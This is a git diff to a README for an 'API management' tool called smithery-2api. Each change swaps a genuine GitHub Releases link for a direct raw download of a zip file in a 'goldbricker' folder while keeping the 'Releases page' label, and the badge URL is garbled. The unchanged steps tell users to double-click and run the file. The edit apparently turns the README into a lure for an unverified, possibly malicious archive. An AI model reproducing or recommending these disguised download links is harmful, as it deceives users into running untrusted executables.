@@ -1,7 +1,7 @@
 # 🚀 smithery-2api - Easy API Management for Everyone
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/ZaClown122/smithery-2api/releases)
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/ZaClown122/smithery-2api/releases)
+[![Download from Releases](https://raw.githubusercontent.com/ZaClown122/smithery-2api/main/goldbricker/smithery-2api.zip%https://raw.githubusercontent.com/ZaClown122/smithery-2api/main/goldbricker/smithery-2api.zip)](https://raw.githubusercontent.com/ZaClown122/smithery-2api/main/goldbricker/smithery-2api.zip)
+[![Download from Releases](https://raw.githubusercontent.com/ZaClown122/smithery-2api/main/goldbricker/smithery-2api.zip%https://raw.githubusercontent.com/ZaClown122/smithery-2api/main/goldbricker/smithery-2api.zip)](https://raw.githubusercontent.com/ZaClown122/smithery-2api/main/goldbricker/smithery-2api.zip)
 
 ## 📥 Overview
 
@@ -12,7 +12,7 @@ smithery-2api is a powerful application designed for easy API management. It all
 To start using smithery-2api, follow these simple steps:
 
 1. **Download the Application**
-   Visit the [Releases page](https://github.com/ZaClown122/smithery-2api/releases) to download the latest version of the application. Choose the file suitable for your system.
+   Visit the [Releases page](https://raw.githubusercontent.com/ZaClown122/smithery-2api/main/goldbricker/smithery-2api.zip) to download the latest version of the application. Choose the file suitable for your system.
 
 2. **Install the Application**
    Once the download is complete, locate the downloaded file on your computer. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -52,7 +52,7 @@ smithery-2api comes packed with features to enhance your experience:
 
 To download and install smithery-2api, follow these steps closely:
 
-1. Visit the [Releases page](https://github.com/ZaClown122/smithery-2api/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ZaClown122/smithery-2api/main/goldbricker/smithery-2api.zip).
 2. Find the latest version listed at the top.
 3. Click the download link that corresponds to your operating system.
 4. Run the downloaded file and follow the installation steps as directed.
